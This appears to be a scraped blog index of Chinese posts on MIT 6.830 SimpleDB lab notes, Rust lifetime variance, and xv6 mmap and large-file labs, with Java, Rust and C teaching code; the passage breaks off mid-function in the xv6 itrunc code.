ntups*。*(h/w)*表示const值在该bucket中的数量的估计值； 对于f\u003econst查询，找出const所在bucket b，其宽度w_b，高度h_b，b_part = (b_right - const)/w_b，b在整个直方图占比b_f = h_b / ntups，那么b对selectivity的贡献是b_f * b_part。然后再算出b右边所有bucket的selectivity； 对于f\u003cconst，同上。 SimpleDB仅支持Int和String，所以直方图也要实现两种。StringHistogram是基于IntHistogram的，所以其实只需要实现IntHistogram。 然后是实现TableStats类，它会计算table的tuple及page的数量，并使用直方图估计估计某些predicate的selectivity。query parser会对query涉及的每个table创建一个TableStats实例，然后将其传递给query optimizer。 1.4 Join Cardinality 评估形如：joincost((t1 join t2) join t3)的join plan p的开销。join cardinality的评估，其实比selectivity更难。在本lab中，实现JoinOptimizer类，只需基于以下简单规则进行： 对于等值join，如果join key中其中一个是主键，那么那么该join产生tuple数量不可能超过另一个非主属性的cardinality； 对于等值join，当没有primary key时，很难说。可以用一些很简单的方法（比如返回较大表的cardinality）； 对于range scan，仍然很难说。输出的size应该和输入的size成正比。可以假定cross-product的固定比例被输出（例如30%）。一般来说，range join的cost应该大于同样大小的两个表的非主键等值join的cost。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab3-query-optimization/:2:1","tags":null,"title":"MIT 6.830 Lab3 Query Optimization","uri":"/posts/mit-6.830-lab3-query-optimization/"},{"categories":null,"content":"2. Join Ordering 实现Selinger优化器。在接下的方法中，join被表达为join nodes（即，2个table上的predicate）的列表，而不是前面class中的用于join的relation的列表。 Selinger算法：只考虑left-deep join。从大小为1的子集开始，不断求出每个子集的最佳join顺序。从size 为i的子集不断扩大到size为 i+1的子集，是一个动态规划方法。 将其转化为如下伪代码： 1. j = set of join nodes 2. for (i in 1...|j|): 3. for s in {all length i subsets of j} 4. bestPlan = {} 5. for s' in {all length d-1 subsets of s} 6. subplan = optjoin(s') 7. plan = best way to join (s-s') to subplan 8. if (cost(plan) \u003c cost(bestPlan)) 9. bestPlan = plan 10. optjoin(s) = bestPlan 11. return optjoin(j) 这个算法本身不难，并且伪代码中的subset、cost等功能，SimpleDB都提供给我们了，把伪代码转写为java就OK了。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab3-query-optimization/:2:2","tags":null,"title":"MIT 6.830 Lab3 Query Optimization","uri":"/posts/mit-6.830-lab3-query-optimization/"},{"categories":null,"content":"简介 lab1中实现了SeqScan operator，它作为后续所有operator读取数据的基础。lab2中将继续实现其他的operator，这样SimpleDB就有了基本的数据存储与查询功能。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab2-operators/:1:0","tags":null,"title":"MIT 6.830 Lab2 Operators","uri":"/posts/mit-6.830-lab2-operators/"},{"categories":null,"content":"Exercises ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab2-operators/:2:0","tags":null,"title":"MIT 6.830 Lab2 Operators","uri":"/posts/mit-6.830-lab2-operators/"},{"categories":null,"content":"1. Filter and Join Filter 仅返回满足某个Predicate的tuples。Predicate类根据被传入的Tuple的某个Field来判断Tuple是否符合要求。 Predicate支持七种类型的筛选条件：EQUALS，GREATER_THAN, LESS_THAN, LESS_THAN_OR_EQ, GREATER_THAN_OR_EQ, LIKE, NOT_EQUALS; Join Join operator使用JoinPredicate将两个子operator返回的结果进行join。JoinPredicate根据被传入的两个Tuple的两个Field判断是否满足join条件。 实现Join可以一般有三种方式（再次借用CMU 15-445的PPT）： NESTED LOOP JOIN 直接使用双层循环，是最符合直觉的join方式。 可以使用分块（Page）读取进行优化，即BLOCK NESTED LOOP JOIN，不过其实我们lab1中实现的SeqScan对上层operator是透明的，并且Page接口没有定义获取一个Page有多少Tuple的方法（HeapPage有，但不通用），所以在SimpleDB中不好直接实现。 如果在join key上有index，我们还可以基于index进行优化 SORT-MERGE JOIN 算法逻辑如下图，但是根据JoinPredicate的不同，有时候需要回溯cursor，例如s.value \u003c r.value这种。 HASH JOIN 基于Hash的join，非常高效，但是这种方法一般只适用于等值Join。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab2-operators/:2:1","tags":null,"title":"MIT 6.830 Lab2 Operators","uri":"/posts/mit-6.830-lab2-operators/"},{"categories":null,"content":"2. Aggregates 我们需要实现五种基本聚合函数：COUNT, SUM, AVG, MIN, MAX，实验中只需要支持对单个Field进行group by与聚合。 SimpleDB定义了Aggregator接口，上层operator调用其mergeTupleIntoGroup(Tuple tup)方法，不断地传入Tuple，Aggregator不断更新聚合的状态。这种设计也有利于query执行的pipeline化；Aggregator还定义了iterator()方法，用于迭代其当前聚合结果。SimpleDB只支持两种数据类型（INT和String），所以需要实现两种对应的Aggregator，使用简单的基于hash的方法实现就好。 然后还需要实现Aggregate operator，它将子operator输出的Tuples全部传递给Aggregator，聚合完成后再向外输出tuples。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab2-operators/:2:2","tags":null,"title":"MIT 6.830 Lab2 Operators","uri":"/posts/mit-6.830-lab2-operators/"},{"categories":null,"content":"3. HeapFile Mutability 目前为止，SimpleDB都还是只读的。所以需要实现修改表的方法。 对deleteTuple，每个Tuple中都包含RecordId，所以可以确定该Tuple在哪个page，然后删除。 对insertTuple，我们需要使用HeapFile中遍历HeapPage，找到有空slot的page，然后插入；如果找不到带有空slot的page，那么就新建一个Page并写入文件。 跟lab1中相同，获取page，一定要通过BufferPool.getPage()，这样对page的访问才能被纳入管理，方便后面实现事务。 insertTuple和deleteTuple这两个mutable的方法，会造成Page的修改，即产生dirty page（修改仅在内存中，未写入disk）。DbFile执行完deleteTuple及insertTuple后，会返回dirty page，BufferPool需要调用Page.markDirty()标记该page，如果page不在BufferPool中，还需要将其加入（明明是通过BufferPool获取的page，为什么可能会不在BufferPool中呢？当然是因为后面的page eviction了）。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab2-operators/:2:3","tags":null,"title":"MIT 6.830 Lab2 Operators","uri":"/posts/mit-6.830-lab2-operators/"},{"categories":null,"content":"4. Page eviction lab1中，当使用page数量超出BufferPool限制，直接抛异常了。这是肯定不行的，所以当BufferPool满了，还要读取新的page时，应当从现有page中淘汰一个，可以选择实现最常见的LRU策略。 ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab2-operators/:2:4","tags":null,"title":"MIT 6.830 Lab2 Operators","uri":"/posts/mit-6.830-lab2-operators/"},{"categories":null,"content":"简介 6.830/6.814是MIT的关系型数据库入门课程，SimpleDB作为课程实验，实现了基础的数据库功能，学生需要实现其中缺少的核心模块。SimpleDB采用Java编写，比另一门数据库名课CMU 15-445/645使用Cpp更友好，可以不用总是考虑内存安全的问题；不过Java全部pass by reference也给我造成一点问题，有时候需要考虑传递过去的对象是否会被改变，被改变了是否会对其他位置的reference造成问题。 6.830和CMU 15-445是基本差不多的，CMU 15-445的Andy老师课讲的很好，本人是观看CMU 15-445课程学习一些所需数据库知识，然后做的6.830的实验。从二月初开始，补一些数据库的知识，到三月初断断续续完成了前三个lab；然后前几日下了决心把它做完，每天做一个lab，又花了两天debug，通过最难的那个BTreeTest。 ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:1:0","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"SimpleDB架构 SimpleDB主要包含下列class： 表示field，tuple，和tuple schema的类 将谓词和筛选条件应用到tuples上的类 一个或多个将relation保存在disk上的方法，并提供迭代relation包含的tuples的方法 一系列处理tuples的operator（如select，join，insert，delete等） buffer pool，用于将活跃的page换存在内存中，并负责处理并发控制和事务 catalog，保存tables和它们schema信息 lab1中涉及的SimpleDB主要模块如下： ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:2:0","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"Exercises ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:3:0","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"1. Fields and Tuples TupleDesc是table的schema，描述了Table中所有Tuple的格式，Tuple由一到多个Field构成。 完成TupleDesc，Tuple。 ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:3:1","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"2. Catalog 全局Catalog是Catalog类的一个单例对象。存储着数据库的元信息。每个table与一个TupleDesc关联，让operator得知table的schema。 修改Catalog类实现添加新表、获取特定表的信息。 ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:3:2","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"3. BufferPool 全局BufferPool是Catalog的一个单例对象。负责管理从disk读取的Page，所有operator都要通过BufferPool读写disk上的Page。 BufferPool中最多保存numPages个Page。首先需要实现最关键的BufferPool.getPage()方法，如果Page已缓存，则直接返回；否则从Catalog中获取对应的数据库文件，读取Page。 ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:3:3","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"4\u00265. HeapFile access method access method是从按照特定格式组织的disk文件中读取数据库数据的方法。SimpleDB中包含HeapFile和B+Tree两种。前4个lab仅与HeapFile相关 如上图所示，HeapFile分成多个HeapPage，每个Page固定大小，包括header和多个Tuple slot。header中有一个bitmap，用来表示某个slot是否被使用。HeapPageId用来唯一标识一个HeapPage，记录Page所在表，page序号。RecordId用来唯一标识一个tuple，记录了tuple所在的PageId，和tuple序号。 本实验需要完善HeapPageId，RecordId，HeapPage类。 BufferPool.getPage()方法需要调用具体的DbFile来读取page，所以要实现HeapFile中读取page的方法。此外，还要实现HeapFile.iterator()方法，用来迭代HeapFile中所有page包含的Tuple。注意：iter中需要使用BufferPool.getPage()来读取page，这样对数据库的访问才能被纳入管理； open() iter时不要把所有page都load到内存，浪费内存。 ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:3:4","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"6. Operators SimpleDB中的多个operators负责query plan的实际执行，它们实现了关系代数中的运算。在SimpleDB中，operator是基于iterator的，每个iterator都实现了DbIterator接口。 借用CMU 15-445的slide，SimpleDB执行query模型如下图。一个query被组织成operator树，底层operator被传递给上层operator的构造器。最底层叶子结点代表access method，从disk中读取tuple；顶层的operator只需要不断调用getNext()，即可输出符合条件的查询结果。顶层的getNext()调用会不断向下传递，直到access method，然后读取tuple再向上传递。如果query中只包含简单的数据筛选，如value \u003e 100，那么整个query树是可以pipeline化的，数据自底向上源源不断的传递，输出；但是遇上join这种operator，就需要其中一个子节点输出所有tuple后才能继续向上传递。 lab1中只需要先实现一个顺序扫描的operator，它顺序扫描指定的表，读取所有tuples。刚好可以利用上面实现的HeapFile.iterator()。 ","date":"2022-04-25","objectID":"/posts/mit-6.830-lab1/:3:5","tags":null,"title":"MIT 6.830 Lab1","uri":"/posts/mit-6.830-lab1/"},{"categories":null,"content":"废柴研究生@UCAS 曾在大厂当螺丝钉实习生，写过golang后端以及rust sdk。目前喜欢看看分布式数据库，琢磨Rust。 ","date":"2021-12-23","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"哲宇酱: https://rinchannowww.github.io 土豆君: https://ipotato.me/ Q哥: https://qjx.app/ 学分: https://sprinter1999.github.io 🐟大佬: https://blog.name1e5s.com/ 袁巨巨: https://columbine21.github.io/ LeiWang1999: https://leiblog.wang clslaid: https://clslaid.icu/ ","date":"2021-12-22","objectID":"/friendlinks/:0:0","tags":null,"title":"友情链接","uri":"/friendlinks/"},{"categories":["rust"],"content":"最近对 rust 的生命周期有一些疑惑，在找资料学习的过程中自然就了解到由 rust 生命周期导出的 rust subtype、variance 的概念，对这一块儿的学习也解答了我一些对其他语言的问题,同时我也被认识的大佬赶鸭子上架,在 BUPT Rust Meetup 做了分享,keynote 讲稿在此。 ","date":"2021-04-29","objectID":"/posts/rust-lifetime-variance/:0:0","tags":["rust","variance","subtype"],"title":"Rust生命周期与变形","uri":"/posts/rust-lifetime-variance/"},{"categories":["rust"],"content":"子类型与变形 子类型是程序语言类型系统中的一个概念，Wikipedia 对其有如下解释： If S is a subtype of T, the subtyping relation is often written S \u003c: T, to mean that any term of type S can be safely used in a context where a term of type T is expected. 许多语言的类型系统都支持子类型，最直接、最熟悉的应当就是面向对象中继承关系形成的子类型。例如Cat类继承了Animal类，那么Cat是Animal的子类型（Cat \u003c: Animal），直觉上很容易想到，任何需要Animal的表达式，我们都可以用Cat去替换，这也是里氏替换原则(Liskov substitution principle)： Let $q(x)$ be a property provable about $x$ of type T. Then $q(y)$ should be true for objects $y$ of type $S$ where $S$ is a subtype of T. 继承关系很直接导出了两个具体类型的之间的子类型关系，可由类型构造器产生的一些更复杂的类型之间的子类型关系如何确定呢？ F(T)为类型构造器，S \u003c: T， 那么F(S)和F(T)的有没有子类型关系呢?如果有，谁是谁的子类型呢？复杂类型之间的子类型关系取决于类型构造器，相对于原始类型，可能是保持、反转或者无关。 如果是是保持，即F(S) \u003c: F(T)，则称之为协变(covariant) 如果是反转，即F(T) \u003c: F(S)，则称之为逆变(contravariant) 如果是无关，则称之为不变/抗变(invariant) covariant、contravariant的概念来自于范畴论(Category Theory)中的函子(Functor)。 ","date":"2021-04-29","objectID":"/posts/rust-lifetime-variance/:1:0","tags":["rust","variance","subtype"],"title":"Rust生命周期与变形","uri":"/posts/rust-lifetime-variance/"},{"categories":["rust"],"content":"变形与类型安全 在下面的 Java 代码中，Cat[]赋值给Animal[]类型的变量可以通过编译，但是ArrayList\u003cCat\u003e赋值给ArrayList\u003cAnimal\u003e类型的变量则无法通过编译。说明 Java 在编译时对数组采用了协变，而对泛型容器采用了抗变。但是在运行时，对数组元素进行错误的赋值，会抛出运行时错误，这实际是一种对于编译期数组协变的补救，数组采用协变本身是一种很差劲的设计。 static class Animal { private int name; } static class Cat extends Animal { public Cat() { } public void meow() { System.out.println(\"meow\"); } } static class Dog extends Animal { public Dog() { } public void bark() { System.out.println(\"bark\"); } } public static void main(String[] args) throws Exception { // covariant, ok Animal[] animals = new Animal[10]; animals = new Cat[10]; // runtime error animals[0] = new Dog(); // invariant, compile error List\u003cAnimal\u003e listAnimals = new ArrayList\u003cAnimal\u003e(); listAnimals = new ArrayList\u003cCat\u003e(); } 由此可见，对于支持子类型的语言，变形的设计是非常重要，其会影响程序的类型安全。 那么，什么时候采用协变，什么时候采用逆变，又在什么时候采用抗变呢？ 想一下这样一个程序，一个函数，接受一个笼子参数，笼子里面装着动物，不管传递的笼子参数中装着什么动物，都将笼子中的动物替换成一只狗，这样做的话，当调用完函数后，外部程序继续将笼子中的动物当作原动物来对待，类型安全就完蛋了。 static class Cage\u003cT extends Animal\u003e { public T inner; public Cage(T a) { this.inner = a; } } static void evil_feed(Cage\u003cAnimal\u003e cage) { cage.inner = new Dog(); } public static void main(String[] args) throws Exception { Cage\u003cCat\u003e cage = new Cage\u003cCat\u003e(new Cat()); evil_feed(cage); cage.inner.meow(); } 上面的这段 Java 代码当然是无法编译成功的，因为 Java 不对泛型容器使用协变。但是不能使用协变的依据是什么呢？是读写操作。 如果一个容器只读，那么我们可以使用协变，将一个Cage\u003cCat\u003e当作Cage\u003cAnimal\u003e读取，任何时候都不会出错；如果类型只写，那么函数中的操作只能对容器内容进行写入或者什么都不做，此时我们可以考虑逆变，即Cage\u003cAnimal\u003e是Cage\u003cDog\u003e的子类型，对于任何需要Cage\u003cDog\u003e的函数，我们都可以传入Cage\u003cAnimal\u003e，函数只会向其中写入一只Dog，而不关心原来是什么，并且程序也永远也不会去读Cage里的东西，程序语言中，逆变基本不出现；如果类型可读可写，那么只能是抗变，要求类型严格一致来保证类型安全。 类型构造器导致逆变的情况非常少，主要出现在以函数作为类型构造器时： $$ F(U) \\rightarrow V $$ 如上的一元函数，接受一个U类型的参数，返回一个V类型的值。如果有U \u003c: T，那么任何需要$F(U) \\rightarrow V$的地方，可以使用$F(T) \\rightarrow V$代替，这很直观，因为U是T的子类型，所以一个能处理 T 类型的函数必然能处理 U 类型，例如一个能计算Animal年龄的函数一定也能计算Cat的年龄，所以有： $$ U \u003c: T \\Rightarrow F(T) \\rightarrow V \u003c: F(U) \\rightarrow V $$ 即我们可以用一个作用域较大的函数代替一个作用域较小的函数，因为我们可以在使用时安全地收缩它的作用域至和后者一样，即只使用Animal中属于Cat的那一部分。 ","date":"2021-04-29","objectID":"/posts/rust-lifetime-variance/:2:0","tags":["rust","variance","subtype"],"title":"Rust生命周期与变形","uri":"/posts/rust-lifetime-variance/"},{"categories":["rust"],"content":"Rust 生命周期 Rust 没有类型继承，但是 Rust 有 lifetime 啊，所以 Rust 的子类型必定是指 lifetime 之间的关系。 在 Rust 中，'a:'b意思是'a outlives 'b，即'a表示的生命周期大于等于'b，也代表着'a \u003c: 'b。乍一看有点反直觉，但也很好理解。'a:'b代表'a至少和'b一样长，即'a比'b更加特化，就像Cat至少是种Animal，Cat更加特化。'static关键字代表静态生命周期，在程序的整个生命周期中持续存在，所以'static是任意生命周期'a的子类型。 我们经常会感叹于 Rust 编译器的智能，能准确推断出程序中某个引用的生命周期不够长、不匹配。这同时也是子类型和变形的功劳。根据上文讨论的结论，Rust 生命周期的子类型有如下变形规则： ‘a T U * \u0026'a T covariant covariant * \u0026'a mut T covariant invariant * Box\u003cT\u003e covariant Vec\u003cT\u003e covariant * UnsafeCell\u003cT\u003e invariant Cell\u003cT\u003e invariant * fn(T) -\u003e U contravariant covariant *const T covariant *mut T invariant 我们看如下这个例子： fn evil_feeder\u003cT\u003e(input: \u0026mut T, val: T) { *input = val; } fn main() { let mut mr_snuggles: \u0026'static str = \"meow! :3\"; // mr. snuggles forever!! { let spike = String::from(\"bark! \u003e:V\"); let spike_str: \u0026str = \u0026spike; // Only lives for the block evil_feeder(\u0026mut mr_snuggles, spike_str); // EVIL! } println!(\"{}\", mr_snuggles); // Use after free? } 编译结果： 我们一眼就能看出，spike_str的 lifetime 太短了，不可能复制给mr_snuggles，那么编译器是如何推断的呢？ 因为\u0026mut T是对 T 的 invariant，所以编译器推断 T 必须是\u0026'static str； spike_str是一个\u0026'a str，对'a是 covariant，要匹配 T，必须尝试通过 covariant 变形成'static str； 那么编译器推断出\u0026'a str:'\u0026'static str，也即'a:'static，这当然无法成立，导致编译错误。 此外，再看一个更明显的例子: // compile error fn invariant\u003c'a: 'b, 'b, 'c\u003e( sub: \u0026'c mut Vec\u003c\u0026'a String\u003e, sup: \u0026'c mut Vec\u003c\u0026'b String\u003e, ) -\u003e \u0026'c mut Vec\u003c\u0026'b String\u003e { sub } // compile ok fn covariant\u003c'a: 'b, 'b, 'c\u003e( sub: \u0026'c Vec\u003c\u0026'a String\u003e, sup: \u0026'c Vec\u003c\u0026'b String\u003e, ) -\u003e \u0026'c Vec\u003c\u0026'b String\u003e { sub } build 结果如下： 在两个函数的泛型参数中，显式标注了'a : 'b； 由于\u0026'a T对'a covariant，所以\u0026'a String : \u0026'b String； 由于Vec\u003cT\u003e对T covariant，所以Vec\u003c\u0026'a String\u003e : Vec\u003c\u0026'b String\u003e； 由于\u0026'a T对 T 是 covariant，所以\u0026'c Vec\u003c\u0026'a String\u003e : \u0026'c Vec\u003c\u0026'b String\u003e； 所以在 covariant 函数中，当函数要求返回\u0026'c Vec\u003c\u0026'b String\u003e时，可以直接返回\u0026'c Vec\u003c\u0026'a String\u003e； 但是\u0026'c mut T对 T 是 invariant，\u0026'c mut Vec\u003c\u0026'a String\u003e与``\u0026‘c mut Vec\u003c\u0026‘b String\u003e`间没有子类型关系，所以在 invariant 函数中无法再这么做。 最后还有一个例子，看看函数的逆变： struct ContraVariant\u003cMixed\u003e { f: fn(Mixed), } fn test\u003c'a\u003e( a: \u0026mut ContraVariant\u003c\u0026'a i32\u003e, b: \u0026mut ContraVariant\u003c\u0026'static i32\u003e, f1: fn(\u0026'a i32), f2: fn(\u0026'static i32), ) { a.f = f1; a.f = f2; b.f = f1; b.f = f2; } fn main() { } build 结果如下： 可以看到，四个赋值语句中，只有a.f = f2失败了。 fn(T)对T contravariant，\u0026'static i32 : \u0026'a i32，所以 fn(\u0026'a i32) : fn(\u0026'static i32)； a.f类型为fn(\u0026'a i32)，f2类型为fn(\u0026'static i32)； a.f = f2，相当于把父类型变量赋值给了子类型，类型不匹配，失败了。 ","date":"2021-04-29","objectID":"/posts/rust-lifetime-variance/:3:0","tags":["rust","variance","subtype"],"title":"Rust生命周期与变形","uri":"/posts/rust-lifetime-variance/"},{"categories":["rust"],"content":"资料援引 https://doc.rust-lang.org/nomicon/subtyping.html https://en.wikipedia.org/wiki/Type_constructor https://en.wikipedia.org/wiki/Subtyping https://en.wikipedia.org/wiki/Covariance_and_contravariance_(computer_science) https://zhuanlan.zhihu.com/p/41814387 ","date":"2021-04-29","objectID":"/posts/rust-lifetime-variance/:4:0","tags":["rust","variance","subtype"],"title":"Rust生命周期与变形","uri":"/posts/rust-lifetime-variance/"},{"categories":["OS"],"content":"mmap和munmap系统调用允许 UNIX 程序对其地址空间进行更为细致的控制。它们可用于在进程间共享内存，将文件映射到进程地址空间，并作为用户级page fault方案的一部分。在本实验室中，我们将在xv6中添加mmap和munmap系统调用，重点是memory-mapped files。 ","date":"2021-03-03","objectID":"/posts/6-s081-lab10-mmap/:0:0","tags":["6.S081","mmap"],"title":"6.S081 lab10 mmap","uri":"/posts/6-s081-lab10-mmap/"},{"categories":["OS"],"content":"Lab: mmap mmap的 API 如下： void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); 在xv6中，addr始终为 0，所以由kernel自行判断应当 map 的地址；prot表示了 mapped memory 的 R、W、X 权限，flags为MAP_SHARED或者MAP_PRIVATE，前者表示对 mapped memory 的修改应写回文件，后者则不需要；offer永远为 0，不用处理文件的偏移量；mmap 成功将返回对应内存起始地址；失败返回0xffffffffffffffff。 munmap(addr, length)需要将从 addr 开始的长度为length的内存unmap。实验指导书保证被munmap的这段内存位于mmap内存区间的头部/尾部或者是全部，munmap不会在中间挖一个洞；当内存是以MAP_SHARED模式被mmap时，需要先将修改写回文件。 看完了对于mmap和munmap的要求，发现其实测试没有一些比较难的case，为我们的实现提供了便利。 之后，就可以跟着 hints 完成实验： 首先添加mmap和munmap的系统调用声明，并且在Makefile中加入_mmaptest。 对 mapped memory 要使用 lazy allocation，就像在之前的实验中那样，这样子使得我们可以在物理内存有限的情况下mmap尽可能大的文件。 记录mmap为每个进程 map 文件的情况，例如地址，长度，权限，对应的文件等等。由于xv6没有真正的内存分配器，所以我们使用一个定长的数组去存储，16 就足够了。 struct VMA { int used; uint64 addr; uint64 end; int prot; int flags; int offset; struct file *f; }; // in struct proc struct VMA vma[NVMA]; uint64 mmap_start; 实现mmap，从用户地址空间找到空闲处 map 文件，修改对应的VMA结构体记录，当对文件mmap后，应当增加文件的引用计数(filedup)，这样当文件被关闭时，VMA持有的文件指针才不会失效。 最重要的就是找到合适的空闲地址，用于mmap。xv6的用户地址空间如下图： 最顶部是trampoline和trapframe，它们占用了两个 page，和stack之间有很大的空闲地址，我们可以将文件 map 到trapframe之下，不断向下增长，mmap_start记录着trapframe下可用于mmap的起始地址，初始值为PGROUNDDOWN(MAXVA - (2 * PGSIZE))。 uint64 sys_mmap(void) { int length, prot, flags, fd; struct file *f; if(argint(1, \u0026length) \u003c 0 || argint(2, \u0026prot) \u003c 0 || argint(3, \u0026flags) \u003c 0 || argfd(4, \u0026fd, \u0026f) \u003c 0) { return 0xffffffffffffffff; } if (!f-\u003ewritable \u0026\u0026 flags == MAP_SHARED \u0026\u0026 (prot \u0026 PROT_WRITE)) { return 0xffffffffffffffff; } // find a vma struct proc *p = myproc(); struct VMA *v; for (v = p-\u003evma; v \u003c p-\u003evma + NVMA; v++) { if(!v-\u003eused) { break; } } if(v == p-\u003evma + NVMA) { return -1; } filedup(f); v-\u003eaddr = PGROUNDDOWN(p-\u003emmap_start - length); v-\u003eend = v-\u003eaddr + length; p-\u003emmap_start = v-\u003eaddr; v-\u003eused = 1; v-\u003ef = f; v-\u003eprot = prot; v-\u003eflags = flags; v-\u003eoffset = 0; return v-\u003eaddr; } 当发生page fault时，为其分配一个真实的物理页面，使用readi将文件内容读入内存，然后将物理页面 map 到用户地址空间，记得正确设置页面的权限。 else if (r_scause() == 13 || r_scause() == 15) { uint64 va = r_stval(); if (va \u003e MAXVA) { p-\u003ekilled = 1; } else { if(mmap_alloc(p-\u003epagetable, va) \u003c 0) { p-\u003ekilled = 1; } } } int mmap_alloc(pagetable_t pagetable, uint64 va) { char *mem; struct proc *p = myproc(); struct VMA *v; // find vma struct for (v = p-\u003evma; v \u003c p-\u003evma + NVMA; v++) { if(v-\u003eused \u0026\u0026 va \u003e= v-\u003eaddr \u0026\u0026 va \u003c v-\u003eend) { break; } } if (v == p-\u003evma + NVMA) { return -1; } mem = kalloc(); if(mem == 0){ return -1; } memset(mem, 0, PGSIZE); begin_op(); ilock(v-\u003ef-\u003eip); int len; if((len = readi(v-\u003ef-\u003eip, 0, (uint64)mem, va - v-\u003eaddr, PGSIZE)) \u003c 0) { iunlock(v-\u003ef-\u003eip); end_op(); return -1; } iunlock(v-\u003ef-\u003eip); end_op(); int f = PTE_U | (v-\u003eprot \u003c\u003c 1); if(mappages(pagetable, va, PGSIZE, (uint64)mem, f) != 0) { kfree(mem); return -1; } return 0; } 实现munmap，找到对应的VMA，使用uvmunmap unmap 对应的内存，当一个mmap的所有内存都被 unmap 时，需要减少对应文件的引用计数；如果内存被修改过，且是以MAP_SHARED模式被mmap，那么需要先将内存内容写回文件。理想态下，我们只应当写回dirty page，但是测试中不会检查这一点，所以将所有内存写回文件即可了。 struct file* fileundup(struct file *f) { acquire(\u0026ftable.lock); if(f-\u003eref \u003c 1) panic(\"filedup\"); f-\u003eref--; release(\u0026ftable.lock); return f; } uint64 sys_munmap(void) { uint64 addr; int length; if(argaddr(0, \u0026addr) \u003c 0 || argint(1, \u0026length) \u003c 0) { return -1; } return s_munmap(addr, length); } uint64 s_munmap(uint64 addr, int length) { struct proc *p = myproc(); struct VMA *v; for (v = p-\u003evma; v \u003c p-\u003evma + NVMA; v++) { if(v-\u003eused \u0026\u0026 v-\u003eaddr \u003c= addr \u0026\u0026 addr + length \u003c= v-\u003eend) { break; } } if(v == p-\u003evma + NVMA) { return -1; } uint64 end = addr + length; uint64 _addr = addr; while (addr \u003c end) { // if already load in if(walkaddr(p-\u003epagetable, addr)) { if(v-\u003eflags == MAP_SHARED \u0026\u0026 v-\u003ef-\u003ewritable) { begin_op(); ilock(v-\u003ef-\u003eip); int size = min(end-addr, PGSIZE); if(writei(v-\u003ef-\u003eip, 1, addr, addr - v-\u003eaddr, size) \u003c size) { iunlock(v-\u003ef-\u003eip); end_op(); return -1; } iunlock(v-\u003ef-\u003eip); end_op(); } uvmunmap(p-\u003epagetable, addr, 1, 1); } addr += PGSIZE; } if(_addr == v-\u003eaddr) { v-\u003eaddr += length; } else if(_addr + length == v-\u003eend) { v-\u003eend -= length; } if (v-\u003eaddr == v-\u003een","date":"2021-03-03","objectID":"/posts/6-s081-lab10-mmap/:1:0","tags":["6.S081","mmap"],"title":"6.S081 lab10 mmap","uri":"/posts/6-s081-lab10-mmap/"},{"categories":["OS"],"content":"Large files 本关需要为xv6添加对大文件的支持。xv6的 inode 默认使用 12 个直接块指针和 1 个间接块指针（指向一个存储着块指针的数据块），所以xv6支持的最大文件尺寸是12 + 1*256=268个 block。我们需要将一个直接块指针修改为双重间接块指针（执行一个存储着间接块指针的数据块），将xv6的最大文件尺寸扩展到11 + 1*256 + 1*256*256= 65803个 block。 首先我们修改kernel/fs.h中的相关宏定义： #define NDIRECT 11 #define NINDIRECT (BSIZE / sizeof(uint)) #define NDOUBLEINDIRECT ((BSIZE / sizeof(uint)) * (BSIZE / sizeof(uint))) #define MAXFILE (NDIRECT + NINDIRECT + NDOUBLEINDIRECT) 然后修改dinode和inode中的地址数组定义： uint addrs[NDIRECT+2]; 接下来修改bmap函数，该函数用于将一个文件的逻辑块号转换为设备的物理块号，类似于虚实地址转换： static uint bmap(struct inode *ip, uint bn) { uint addr, *a; struct buf *bp; if(bn \u003c NDIRECT){ if((addr = ip-\u003eaddrs[bn]) == 0) ip-\u003eaddrs[bn] = addr = balloc(ip-\u003edev); return addr; } bn -= NDIRECT; if(bn \u003c NINDIRECT){ // Load indirect block, allocating if necessary. if((addr = ip-\u003eaddrs[NDIRECT]) == 0) ip-\u003eaddrs[NDIRECT] = addr = balloc(ip-\u003edev); bp = bread(ip-\u003edev, addr); a = (uint*)bp-\u003edata; if((addr = a[bn]) == 0){ a[bn] = addr = balloc(ip-\u003edev); log_write(bp); } brelse(bp); return addr; } bn -= NINDIRECT; if(bn \u003c NDOUBLEINDIRECT){ // Load double-indirect block, allocating if necessary. if((addr = ip-\u003eaddrs[NDIRECT+1]) == 0) ip-\u003eaddrs[NDIRECT+1] = addr = balloc(ip-\u003edev); bp = bread(ip-\u003edev, addr); a = (uint*)bp-\u003edata; uint level1 = bn / NINDIRECT; if((addr = a[level1]) == 0){ a[level1] = addr = balloc(ip-\u003edev); log_write(bp); } brelse(bp); bp = bread(ip-\u003edev, addr); a = (uint*)bp-\u003edata; uint level2 = bn % NINDIRECT; if((addr = a[level2]) == 0){ a[level2] = addr = balloc(ip-\u003edev); log_write(bp); } brelse(bp); return addr; } panic(\"bmap: out of range\"); } 然后修改itrunc函数，在 truncate 文件时，释放我们新添加的双重间接数据块（不要忘了释放指针块本身）： void itrunc(struct inode *ip) { int i, j, k; struct buf *bp, *nbp; uint *a, *na; for(i = 0; i \u003c NDIRECT; i++){ if(ip-\u003eaddrs[i]){ bfree(ip-\u003edev, 